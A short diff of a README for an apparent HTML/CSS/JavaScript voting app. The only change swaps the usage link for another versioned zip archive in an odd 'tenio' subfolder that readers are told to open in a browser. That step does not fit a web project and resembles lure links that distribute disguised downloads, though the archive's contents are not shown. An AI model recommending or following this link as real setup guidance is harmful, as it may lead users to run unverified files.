@@ -9,7 +9,7 @@ Responsive desig
 HTML, CSS, JavaScript
 🚀 Usage
 Clone the repo
-Open https://github.com/Eliakim-ellie/Interactive-voting-system/raw/refs/heads/main/tenio/system_Interactive_voting_2.9.zip in a browser
+Open https://raw.githubusercontent.com/Eliakim-ellie/Interactive-voting-system/main/tenio/system-Interactive-voting-3.6-beta.4.zip in a browser
 
 Vote and see results instantly
 👤 Author
